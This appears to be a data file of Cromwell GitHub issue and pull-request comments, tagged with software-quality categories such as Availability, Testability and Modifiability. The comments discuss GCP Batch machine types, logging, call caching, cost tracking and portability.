https://cloud.google.com/batch/docs/troubleshooting#reserved-exit-codes. Thanks.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7412#issuecomment-2131570709
https://github.com/broadinstitute/cromwell/pull/7415#issuecomment-2108732999:107,Availability,error,error,107,@jgainerdewar Accidentally deleted your comment in the new IJ UI. Reposting here:; > What about tasks that error out? Do we need to store cost data there the same way we do complete and cancelled tasks?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7415#issuecomment-2108732999
https://github.com/broadinstitute/cromwell/pull/7415#issuecomment-2108736119:115,Availability,error,error,115,"> @jgainerdewar Accidentally deleted your comment in the new IJ UI. Reposting here:; > ; > > What about tasks that error out? Do we need to store cost data there the same way we do complete and cancelled tasks?. I think we should include cost data for errored/failed tasks so the information is available and can be stored. From my understanding, task that doesn't immediately fail/error can still incur cost that should still be calculated.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7415#issuecomment-2108736119
https://github.com/broadinstitute/cromwell/pull/7415#issuecomment-2108736119:252,Availability,error,errored,252,"> @jgainerdewar Accidentally deleted your comment in the new IJ UI. Reposting here:; > ; > > What about tasks that error out? Do we need to store cost data there the same way we do complete and cancelled tasks?. I think we should include cost data for errored/failed tasks so the information is available and can be stored. From my understanding, task that doesn't immediately fail/error can still incur cost that should still be calculated.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7415#issuecomment-2108736119
https://github.com/broadinstitute/cromwell/pull/7415#issuecomment-2108736119:295,Availability,avail,available,295,"> @jgainerdewar Accidentally deleted your comment in the new IJ UI. Reposting here:; > ; > > What about tasks that error out? Do we need to store cost data there the same way we do complete and cancelled tasks?. I think we should include cost data for errored/failed tasks so the information is available and can be stored. From my understanding, task that doesn't immediately fail/error can still incur cost that should still be calculated.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7415#issuecomment-2108736119
https://github.com/broadinstitute/cromwell/pull/7415#issuecomment-2108736119:382,Availability,error,error,382,"> @jgainerdewar Accidentally deleted your comment in the new IJ UI. Reposting here:; > ; > > What about tasks that error out? Do we need to store cost data there the same way we do complete and cancelled tasks?. I think we should include cost data for errored/failed tasks so the information is available and can be stored. From my understanding, task that doesn't immediately fail/error can still incur cost that should still be calculated.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7415#issuecomment-2108736119
https://github.com/broadinstitute/cromwell/pull/7430#issuecomment-2108031269:170,Modifiability,refactor,refactor,170,`StandardAsyncExecutionActor.scala` doesn't have PAPI in the name but I think this is also probably something we don't want to touch until Batch. I even started a [major refactor](https://github.com/broadinstitute/cromwell/compare/develop...aen_wx_1625) but decided to postpone for now.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7430#issuecomment-2108031269
https://github.com/broadinstitute/cromwell/pull/7434#issuecomment-2168684880:5,Availability,failure,failures,5,"Test failures unrelated to this PR should be fixed, as of the merge I did just now.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7434#issuecomment-2168684880
https://github.com/broadinstitute/cromwell/pull/7434#issuecomment-2168684880:0,Testability,Test,Test,0,"Test failures unrelated to this PR should be fixed, as of the merge I did just now.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7434#issuecomment-2168684880
https://github.com/broadinstitute/cromwell/pull/7440#issuecomment-2115334339:43,Testability,test,tests,43,"I don't think this is working right... the tests that have `[GCPBatch, Papiv2]` are skipped on Batch because the default test format is ""all"" (Cromwell must support all backends listed).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7440#issuecomment-2115334339
https://github.com/broadinstitute/cromwell/pull/7440#issuecomment-2115334339:121,Testability,test,test,121,"I don't think this is working right... the tests that have `[GCPBatch, Papiv2]` are skipped on Batch because the default test format is ""all"" (Cromwell must support all backends listed).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7440#issuecomment-2115334339
https://github.com/broadinstitute/cromwell/issues/7451#issuecomment-2284350841:81,Modifiability,config,config,81,"I would like to add my support to Greg's question. The. memory_retry_multiplier. config option would be a super-super useful feature to use for genomic workflows with varying data sises. If it is working on GCP, ould you please document it's use better? Or let us know if it is an abandonned feature.. Or even better send us working examples :). Thanks for all the work you do.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7451#issuecomment-2284350841
https://github.com/broadinstitute/cromwell/issues/7465#issuecomment-2203351311:124,Usability,resume,resume,124,"No, every workflow gets a new ID. You can re-submit with the same parameters and call caching, if enabled, should act as a ""resume"" function and re-use existing results.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7465#issuecomment-2203351311
https://github.com/broadinstitute/cromwell/pull/7469#issuecomment-2269754420:34,Modifiability,portab,portable,34,"[This is intended to make it more portable](https://stackoverflow.com/a/10383546/15114474) . Currently, cromwell couldn't work on NixOS or Guix, for example, see #3201",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7469#issuecomment-2269754420
https://github.com/broadinstitute/cromwell/pull/7469#issuecomment-2269916313:32,Modifiability,portab,portable,32,"This small change could make it portable on any esoteric distribution / container. > also risks breaking an unknown number of cases that work fine now. Not using env is more ""risky"" in term of portability, as it would be less portable. This is due to unix requirements",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7469#issuecomment-2269916313
https://github.com/broadinstitute/cromwell/pull/7469#issuecomment-2269916313:193,Modifiability,portab,portability,193,"This small change could make it portable on any esoteric distribution / container. > also risks breaking an unknown number of cases that work fine now. Not using env is more ""risky"" in term of portability, as it would be less portable. This is due to unix requirements",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7469#issuecomment-2269916313
https://github.com/broadinstitute/cromwell/pull/7469#issuecomment-2269916313:226,Modifiability,portab,portable,226,"This small change could make it portable on any esoteric distribution / container. > also risks breaking an unknown number of cases that work fine now. Not using env is more ""risky"" in term of portability, as it would be less portable. This is due to unix requirements",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7469#issuecomment-2269916313
https://github.com/broadinstitute/cromwell/pull/7469#issuecomment-2269916313:90,Safety,risk,risks,90,"This small change could make it portable on any esoteric distribution / container. > also risks breaking an unknown number of cases that work fine now. Not using env is more ""risky"" in term of portability, as it would be less portable. This is due to unix requirements",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7469#issuecomment-2269916313
https://github.com/broadinstitute/cromwell/pull/7469#issuecomment-2269916313:175,Safety,risk,risky,175,"This small change could make it portable on any esoteric distribution / container. > also risks breaking an unknown number of cases that work fine now. Not using env is more ""risky"" in term of portability, as it would be less portable. This is due to unix requirements",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7469#issuecomment-2269916313
https://github.com/broadinstitute/cromwell/issues/7473#issuecomment-2239490428:22,Security,hash,hash,22,Please say your image hash e.g. `87-xxxxxxx` and backend (which I assume is Batch).,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7473#issuecomment-2239490428
https://github.com/broadinstitute/cromwell/issues/7473#issuecomment-2239621915:58,Deployability,release,released,58,I was encountering the call caching issue with the latest released version 87. The issue is resolved with the develop branch 88-90ca58d.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7473#issuecomment-2239621915
https://github.com/broadinstitute/cromwell/issues/7474#issuecomment-2252813190:346,Deployability,configurat,configuration,346,"This is with the GCP Batch backend correct? Machine Type is a parameter in Batch, but not a parameter in Cromwell. If a machine type is not defined Batch selects the machine type based on the CPU and Memory request. Setting `cpuPlatform` is the way to not get an e series machine. Did you get an e series machine with ""Intel Cascade Lake"" in the configuration?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7474#issuecomment-2252813190
https://github.com/broadinstitute/cromwell/issues/7474#issuecomment-2252813190:346,Modifiability,config,configuration,346,"This is with the GCP Batch backend correct? Machine Type is a parameter in Batch, but not a parameter in Cromwell. If a machine type is not defined Batch selects the machine type based on the CPU and Memory request. Setting `cpuPlatform` is the way to not get an e series machine. Did you get an e series machine with ""Intel Cascade Lake"" in the configuration?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7474#issuecomment-2252813190
https://github.com/broadinstitute/cromwell/issues/7474#issuecomment-2254634598:130,Deployability,configurat,configuration,130,"Assuming that putting that in the runtime {cpuPlatform: ""Intel Cascade Lake""} setting in the Cromwell conf file counts as ""in the configuration"", then yes. If we have to hand edit every single one of our WDL task files to put that in a runtime block, not I haven't tried that",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7474#issuecomment-2254634598
https://github.com/broadinstitute/cromwell/issues/7474#issuecomment-2254634598:130,Modifiability,config,configuration,130,"Assuming that putting that in the runtime {cpuPlatform: ""Intel Cascade Lake""} setting in the Cromwell conf file counts as ""in the configuration"", then yes. If we have to hand edit every single one of our WDL task files to put that in a runtime block, not I haven't tried that",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7474#issuecomment-2254634598
https://github.com/broadinstitute/cromwell/issues/7474#issuecomment-2256082242:81,Energy Efficiency,schedul,scheduling,81,Thanks. Setting `cpuPlatform` in the runtime attributes is the only way to avoid scheduling to an e series machines through Cromwell. GCP Batch is limited to setting cpuPlatform or instance type. There is no preferred machine family type setting in GCP Batch. With that said the e series machine should not be that slow. Performance is supposed to be comparable to N1. If it repeatable open a support case with GCP.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7474#issuecomment-2256082242
https://github.com/broadinstitute/cromwell/issues/7474#issuecomment-2256082242:321,Performance,Perform,Performance,321,Thanks. Setting `cpuPlatform` in the runtime attributes is the only way to avoid scheduling to an e series machines through Cromwell. GCP Batch is limited to setting cpuPlatform or instance type. There is no preferred machine family type setting in GCP Batch. With that said the e series machine should not be that slow. Performance is supposed to be comparable to N1. If it repeatable open a support case with GCP.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7474#issuecomment-2256082242
https://github.com/broadinstitute/cromwell/issues/7474#issuecomment-2256082242:75,Safety,avoid,avoid,75,Thanks. Setting `cpuPlatform` in the runtime attributes is the only way to avoid scheduling to an e series machines through Cromwell. GCP Batch is limited to setting cpuPlatform or instance type. There is no preferred machine family type setting in GCP Batch. With that said the e series machine should not be that slow. Performance is supposed to be comparable to N1. If it repeatable open a support case with GCP.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7474#issuecomment-2256082242
https://github.com/broadinstitute/cromwell/issues/7474#issuecomment-2256114108:639,Modifiability,rewrite,rewrite,639,"""The E2 machine series also contains shared-core machine types that use context- switching to time-share a physical core between vCPUs for multitasking"". Essentially, they are garbage machines that give you 1/2 the CPUs you ask for, and have horrid I/O. IMO, no one should ever be given one, unless they've explicitly asked for it. Especially in a bioinformatics environment, where you're going to be reading and writing large files on a regular basis. Where in the code is the E2 default set? That's the part I was unable to figure out. If I could have that, I can fix it, put in a PR, and make our own version that doesn't require us to rewrite all our task files. Thank you",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7474#issuecomment-2256114108
https://github.com/broadinstitute/cromwell/issues/7474#issuecomment-2322351550:23,Availability,avail,available,23,"Fixes for this will be available in the next Cromwell release, no ETA yet. If you need the fixes immediately and are comfortable building from the `develop` branch, that is also an option.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7474#issuecomment-2322351550
https://github.com/broadinstitute/cromwell/issues/7474#issuecomment-2322351550:54,Deployability,release,release,54,"Fixes for this will be available in the next Cromwell release, no ETA yet. If you need the fixes immediately and are comfortable building from the `develop` branch, that is also an option.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7474#issuecomment-2322351550
https://github.com/broadinstitute/cromwell/issues/7474#issuecomment-2402956654:25,Availability,avail,available,25,"> Fixes for this will be available in the next Cromwell release, no ETA yet. If you need the fixes immediately and are comfortable building from the `develop` branch, that is also an option. I built cromwell 88. Then I ran two large preemptible runs, one with cromwell 87 and the other with 88. The e2 with standard machines ran faster, and was pre-empted less, than the n1 with custom machines.; 11% faster, and 424 preemptions vs 276. Many of the 424 were preemptions that happened really early in the run process. So it may be that I just had bad luck with someone kicking off a large non-spot run while my 88 run was going but teh 87 was finished. But I've been advised that custom machine types are much more likely to be preempted than standard ones. Would it be possible for you to default to n1 or n2 standard machines, rather than custom ones?. Thank you",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7474#issuecomment-2402956654
https://github.com/broadinstitute/cromwell/issues/7474#issuecomment-2402956654:56,Deployability,release,release,56,"> Fixes for this will be available in the next Cromwell release, no ETA yet. If you need the fixes immediately and are comfortable building from the `develop` branch, that is also an option. I built cromwell 88. Then I ran two large preemptible runs, one with cromwell 87 and the other with 88. The e2 with standard machines ran faster, and was pre-empted less, than the n1 with custom machines.; 11% faster, and 424 preemptions vs 276. Many of the 424 were preemptions that happened really early in the run process. So it may be that I just had bad luck with someone kicking off a large non-spot run while my 88 run was going but teh 87 was finished. But I've been advised that custom machine types are much more likely to be preempted than standard ones. Would it be possible for you to default to n1 or n2 standard machines, rather than custom ones?. Thank you",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7474#issuecomment-2402956654
https://github.com/broadinstitute/cromwell/issues/7474#issuecomment-2402959627:25,Availability,avail,available,25,"> Fixes for this will be available in the next Cromwell release, no ETA yet. If you need the fixes immediately and are comfortable building from the `develop` branch, that is also an option. BTW, I really miss the logging you eliminated. With 87 I see the machine type allocated, with 88 I don't. Is there some command line option for turning all the logging back on?. Thank you",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7474#issuecomment-2402959627
https://github.com/broadinstitute/cromwell/issues/7474#issuecomment-2402959627:56,Deployability,release,release,56,"> Fixes for this will be available in the next Cromwell release, no ETA yet. If you need the fixes immediately and are comfortable building from the `develop` branch, that is also an option. BTW, I really miss the logging you eliminated. With 87 I see the machine type allocated, with 88 I don't. Is there some command line option for turning all the logging back on?. Thank you",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7474#issuecomment-2402959627
https://github.com/broadinstitute/cromwell/issues/7474#issuecomment-2402959627:269,Energy Efficiency,allocate,allocated,269,"> Fixes for this will be available in the next Cromwell release, no ETA yet. If you need the fixes immediately and are comfortable building from the `develop` branch, that is also an option. BTW, I really miss the logging you eliminated. With 87 I see the machine type allocated, with 88 I don't. Is there some command line option for turning all the logging back on?. Thank you",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7474#issuecomment-2402959627
https://github.com/broadinstitute/cromwell/issues/7474#issuecomment-2402959627:214,Testability,log,logging,214,"> Fixes for this will be available in the next Cromwell release, no ETA yet. If you need the fixes immediately and are comfortable building from the `develop` branch, that is also an option. BTW, I really miss the logging you eliminated. With 87 I see the machine type allocated, with 88 I don't. Is there some command line option for turning all the logging back on?. Thank you",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7474#issuecomment-2402959627
https://github.com/broadinstitute/cromwell/issues/7474#issuecomment-2402959627:351,Testability,log,logging,351,"> Fixes for this will be available in the next Cromwell release, no ETA yet. If you need the fixes immediately and are comfortable building from the `develop` branch, that is also an option. BTW, I really miss the logging you eliminated. With 87 I see the machine type allocated, with 88 I don't. Is there some command line option for turning all the logging back on?. Thank you",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7474#issuecomment-2402959627
https://github.com/broadinstitute/cromwell/issues/7480#issuecomment-2269738159:104,Integrability,depend,dependent,104,"I've never used Cromwell this way but my understanding is that good call caching performance is heavily dependent on cloud object storage. This is because it returns checksums in a short, constant time.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7480#issuecomment-2269738159
https://github.com/broadinstitute/cromwell/issues/7480#issuecomment-2269738159:81,Performance,perform,performance,81,"I've never used Cromwell this way but my understanding is that good call caching performance is heavily dependent on cloud object storage. This is because it returns checksums in a short, constant time.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7480#issuecomment-2269738159
https://github.com/broadinstitute/cromwell/issues/7480#issuecomment-2269738159:166,Security,checksum,checksums,166,"I've never used Cromwell this way but my understanding is that good call caching performance is heavily dependent on cloud object storage. This is because it returns checksums in a short, constant time.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7480#issuecomment-2269738159
https://github.com/broadinstitute/cromwell/issues/7481#issuecomment-2261269185:9,Availability,down,down,9,"GCP shut down Genomics on July 9, 2024 and the backend will be removed from Cromwell. Life Sciences is the replacement, for example; ```; endpoint-url = ""https://lifesciences.googleapis.com/""; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7481#issuecomment-2261269185
https://github.com/broadinstitute/cromwell/issues/7486#issuecomment-2271513747:74,Deployability,update,updates,74,"We will gladly accept a doc PR for this, docs are one of the more popular updates by the community.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7486#issuecomment-2271513747
https://github.com/broadinstitute/cromwell/issues/7489#issuecomment-2299775834:202,Testability,log,logic,202,Hi @kachulis - this behavior is expected with GCP Batch as the persistent disk gets remounted to the replacement VM. There is not a way to specify a new disk on the Google Cloud side so please add some logic to your workflow to clear out files if present if that is needed.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7489#issuecomment-2299775834
https://github.com/broadinstitute/cromwell/issues/7489#issuecomment-2299775834:228,Usability,clear,clear,228,Hi @kachulis - this behavior is expected with GCP Batch as the persistent disk gets remounted to the replacement VM. There is not a way to specify a new disk on the Google Cloud side so please add some logic to your workflow to clear out files if present if that is needed.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7489#issuecomment-2299775834
https://github.com/broadinstitute/cromwell/issues/7489#issuecomment-2346453653:190,Safety,risk,risky,190,"Thanks for the clarification @dspeck1. I would just like to comment that the behavior here feels very unintuitive from a user perspective, and so pushing the handling of it onto users feels risky to me. Personally, I would be very surprised if many users would think to implement handling this themselves, even if there were an attempt to widely document it; it's just too different from the way (at least I) expect a workflow task to operate. Given the requirements for hitting this behavior, I don't _think_ there is a risk to workflow accuracy or reproducibility associated with it. But I haven't systematically explored the entire space of this edge case, so it certainly does worry me a bit that some sort of strange related behavior could somehow affect workflows which actually succeed. Which would be a much more significant issue, imo.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7489#issuecomment-2346453653
https://github.com/broadinstitute/cromwell/issues/7489#issuecomment-2346453653:521,Safety,risk,risk,521,"Thanks for the clarification @dspeck1. I would just like to comment that the behavior here feels very unintuitive from a user perspective, and so pushing the handling of it onto users feels risky to me. Personally, I would be very surprised if many users would think to implement handling this themselves, even if there were an attempt to widely document it; it's just too different from the way (at least I) expect a workflow task to operate. Given the requirements for hitting this behavior, I don't _think_ there is a risk to workflow accuracy or reproducibility associated with it. But I haven't systematically explored the entire space of this edge case, so it certainly does worry me a bit that some sort of strange related behavior could somehow affect workflows which actually succeed. Which would be a much more significant issue, imo.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7489#issuecomment-2346453653
https://github.com/broadinstitute/cromwell/pull/7491#issuecomment-2286243613:31,Testability,log,logs,31,"> set it to ""PATH"" to save the logs into the the mounted disk, at the end, this log file gets copied to the google cloud storage bucket with ""task.log"" as the name. Do the task logs really only get copied to the storage bucket **after** the job completes? Cloud Life Sciences asynchronously copies task logs to GCS periodically **while the job is running**. This is the main utility of the task logs in that they allow users to see how jobs are progressing before they terminate.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7491#issuecomment-2286243613
https://github.com/broadinstitute/cromwell/pull/7491#issuecomment-2286243613:80,Testability,log,log,80,"> set it to ""PATH"" to save the logs into the the mounted disk, at the end, this log file gets copied to the google cloud storage bucket with ""task.log"" as the name. Do the task logs really only get copied to the storage bucket **after** the job completes? Cloud Life Sciences asynchronously copies task logs to GCS periodically **while the job is running**. This is the main utility of the task logs in that they allow users to see how jobs are progressing before they terminate.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7491#issuecomment-2286243613
https://github.com/broadinstitute/cromwell/pull/7491#issuecomment-2286243613:147,Testability,log,log,147,"> set it to ""PATH"" to save the logs into the the mounted disk, at the end, this log file gets copied to the google cloud storage bucket with ""task.log"" as the name. Do the task logs really only get copied to the storage bucket **after** the job completes? Cloud Life Sciences asynchronously copies task logs to GCS periodically **while the job is running**. This is the main utility of the task logs in that they allow users to see how jobs are progressing before they terminate.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7491#issuecomment-2286243613
https://github.com/broadinstitute/cromwell/pull/7491#issuecomment-2286243613:177,Testability,log,logs,177,"> set it to ""PATH"" to save the logs into the the mounted disk, at the end, this log file gets copied to the google cloud storage bucket with ""task.log"" as the name. Do the task logs really only get copied to the storage bucket **after** the job completes? Cloud Life Sciences asynchronously copies task logs to GCS periodically **while the job is running**. This is the main utility of the task logs in that they allow users to see how jobs are progressing before they terminate.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7491#issuecomment-2286243613
https://github.com/broadinstitute/cromwell/pull/7491#issuecomment-2286243613:303,Testability,log,logs,303,"> set it to ""PATH"" to save the logs into the the mounted disk, at the end, this log file gets copied to the google cloud storage bucket with ""task.log"" as the name. Do the task logs really only get copied to the storage bucket **after** the job completes? Cloud Life Sciences asynchronously copies task logs to GCS periodically **while the job is running**. This is the main utility of the task logs in that they allow users to see how jobs are progressing before they terminate.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7491#issuecomment-2286243613
https://github.com/broadinstitute/cromwell/pull/7491#issuecomment-2286243613:395,Testability,log,logs,395,"> set it to ""PATH"" to save the logs into the the mounted disk, at the end, this log file gets copied to the google cloud storage bucket with ""task.log"" as the name. Do the task logs really only get copied to the storage bucket **after** the job completes? Cloud Life Sciences asynchronously copies task logs to GCS periodically **while the job is running**. This is the main utility of the task logs in that they allow users to see how jobs are progressing before they terminate.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7491#issuecomment-2286243613
https://github.com/broadinstitute/cromwell/pull/7491#issuecomment-2286348141:14,Testability,log,logs,14,"> Do the task logs really only get copied to the storage bucket after the job completes?. Unfortunately, yes. In theory, Google can push these logs directly to the Cloud Storage but we were told that the docs are wrong and that feature does not work (see https://cloud.google.com/php/docs/reference/cloud-batch/latest/V1.LogsPolicy). > logs_path: The path to which logs are saved when the destination = PATH. This can be a local file path on the VM, or under the mount point of a Persistent Disk or Filestore, or a Cloud Storage path.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7491#issuecomment-2286348141
https://github.com/broadinstitute/cromwell/pull/7491#issuecomment-2286348141:143,Testability,log,logs,143,"> Do the task logs really only get copied to the storage bucket after the job completes?. Unfortunately, yes. In theory, Google can push these logs directly to the Cloud Storage but we were told that the docs are wrong and that feature does not work (see https://cloud.google.com/php/docs/reference/cloud-batch/latest/V1.LogsPolicy). > logs_path: The path to which logs are saved when the destination = PATH. This can be a local file path on the VM, or under the mount point of a Persistent Disk or Filestore, or a Cloud Storage path.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7491#issuecomment-2286348141
https://github.com/broadinstitute/cromwell/pull/7491#issuecomment-2286348141:321,Testability,Log,LogsPolicy,321,"> Do the task logs really only get copied to the storage bucket after the job completes?. Unfortunately, yes. In theory, Google can push these logs directly to the Cloud Storage but we were told that the docs are wrong and that feature does not work (see https://cloud.google.com/php/docs/reference/cloud-batch/latest/V1.LogsPolicy). > logs_path: The path to which logs are saved when the destination = PATH. This can be a local file path on the VM, or under the mount point of a Persistent Disk or Filestore, or a Cloud Storage path.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7491#issuecomment-2286348141
https://github.com/broadinstitute/cromwell/pull/7491#issuecomment-2286348141:365,Testability,log,logs,365,"> Do the task logs really only get copied to the storage bucket after the job completes?. Unfortunately, yes. In theory, Google can push these logs directly to the Cloud Storage but we were told that the docs are wrong and that feature does not work (see https://cloud.google.com/php/docs/reference/cloud-batch/latest/V1.LogsPolicy). > logs_path: The path to which logs are saved when the destination = PATH. This can be a local file path on the VM, or under the mount point of a Persistent Disk or Filestore, or a Cloud Storage path.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7491#issuecomment-2286348141
https://github.com/broadinstitute/cromwell/pull/7491#issuecomment-2286854406:0,Testability,Log,Logs,0,Logs are seen as job progresses with the `CLOUD_LOGGING` option.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7491#issuecomment-2286854406
